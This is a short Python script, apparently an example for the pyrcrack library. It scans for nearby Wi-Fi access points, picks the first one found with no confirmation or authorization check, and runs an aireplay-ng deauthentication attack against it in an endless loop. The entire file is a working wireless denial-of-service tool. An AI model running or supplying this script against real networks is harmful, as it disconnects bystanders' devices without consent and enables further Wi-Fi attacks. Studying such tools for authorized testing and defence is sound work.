"""Deauth"""
import asyncio
from contextlib import suppress

from rich.console import Console

import pyrcrack

CONSOLE = Console()
CONSOLE.clear()
CONSOLE.show_cursor(show=False)


async def attack(apo):
    """Run aireplay deauth attack."""
    airmon = pyrcrack.AirmonNg()
    interfaces = await airmon.interfaces
    CONSOLE.print("Starting airmon-ng with channel {}".format(apo.channel))
    interface = interfaces[0]
    async with airmon(interface.interface, apo.channel) as mon:
        async with pyrcrack.AireplayNg() as aireplay:
            CONSOLE.print("Starting aireplay on {} for {}".format(
                mon.monitor_interface, apo.bssid))
            await aireplay.run(mon.monitor_interface,
                               deauth=10,
                               D=True,
                               b=apo.bssid)
            while True:
                CONSOLE.print(aireplay.meta)
                await asyncio.sleep(2)


async def deauth():
    """Scan for targets, return json."""
    airmon = pyrcrack.AirmonNg()
    interfaces = await airmon.interfaces
    async with airmon(interfaces[0].interface) as mon:
        async with pyrcrack.AirodumpNg() as pdump:
            async for result in pdump(mon.monitor_interface):
                CONSOLE.print(result.table)
                with suppress(KeyError):
                    ap = result[0]
                    CONSOLE.print("Selected AP {}".format(ap.bssid))
                    break
                await asyncio.sleep(3)
    await attack(ap)


asyncio.run(deauth())
